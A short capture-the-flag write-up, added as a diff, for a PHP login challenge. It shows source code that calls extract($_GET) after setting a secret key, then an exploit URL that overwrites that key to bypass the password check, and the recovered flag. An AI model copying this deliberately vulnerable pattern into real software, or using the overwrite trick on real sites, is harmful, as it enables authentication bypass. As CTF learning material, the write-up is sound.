@@ -1,0 +1,33 @@
+<html>
+  <head>
+    <title>Admin Key Panel</title>
+  </head>
+  <body>
+    <p>Enter admin password for key</p>
+    <?php
+      $secret_key = '';
+      extract($_GET);
+      $flag = '';
+      if (isset($password)) {
+        if ($password === $secret_key) {
+          echo "<p>Correct!</p>";
+          echo "<p>Flag: "." $flag</p>";
+        } else {
+          echo "<p>Incorrect!</p>";
+        }
+      }
+    ?>
+    <form action="#" method="GET">
+      <p><input type="text" name="password"></p>
+      <p><input type="submit" value=""></p>
+    </form>
+  </body>
+</html>
+
+Source code is above.
+
+Notice the script runs extrac($_GET) after it sets $secret_key. Therefore we can exploit this extract() function call to modify the value of $secret_key in the url:
+
+https://2013.picoctf.com/problems/php1/?password=asdf&secret_key=asdf
+
+Key: php_means_youre_going_to_have_a_bad_time
